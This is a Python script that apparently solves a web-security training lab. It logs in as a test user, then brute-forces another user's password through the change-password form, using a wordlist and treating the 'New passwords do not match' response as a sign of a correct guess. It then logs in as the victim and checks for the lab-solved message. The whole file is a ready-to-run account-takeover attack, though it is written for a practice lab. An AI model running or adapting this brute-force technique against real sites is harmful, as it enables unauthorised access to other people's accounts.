# Password brute-force via password change

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def connect_as_wiener(s, url):
	login_path = url + '/login'
	time.sleep(1)
	data_login = {'username': 'wiener', 'password': 'peter'}
	print('\n[+] Sending connection to the application as Wiener...')
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: wiener' in r.text:
		return r
	else:
		print('[-] Exploit failed to connect as Wiener <!>')
		sys.exit(1)

def brute_force_password(s, url):
	change_passw_path = url + '/my-account/change-password'
	print(f"\n[+] Trying to brute force the change password page to find Carlos's password...")
	with open('./passwords.txt') as f:
		for line in f:
			password = line.strip()
			change_passw_data = {'username': 'carlos', 'current-password': password, 'new-password-1': 'Password123', 'new-password-2': 'Password321'}
			r = s.post(change_passw_path, data=change_passw_data)

			if 'New passwords do not match' in r.text:
				print("[+] Found Carlos's Password:\t%s" % password)
				return password
	print('[-] Failed to find a valid Password')
	sys.exit(1)

def connect_as_carlos(s, url, password):
	print('\n[+] Logging in as Carlos with found password...')
	login_path = url + '/login'
	login_data = 'username=carlos&password=' + password
	r = s.post(login_path, data=login_data)
	if 'Your username is: carlos' in r.text:
		print('[+] Logged in as Carlos !')
		return r
	print('[-] Failed to log in as Carlos <!>')
	sys.exit(1)

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Password brute-force via password change')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find valid credentials brute-forcing the login page...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			r = connect_as_wiener(s, url)
			time.sleep(2)
			password = brute_force_password(s, url)
			time.sleep(1)
			r = connect_as_carlos(s, url, password)
			time.sleep(1)
			r = s.get(url + '/my-account')

			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
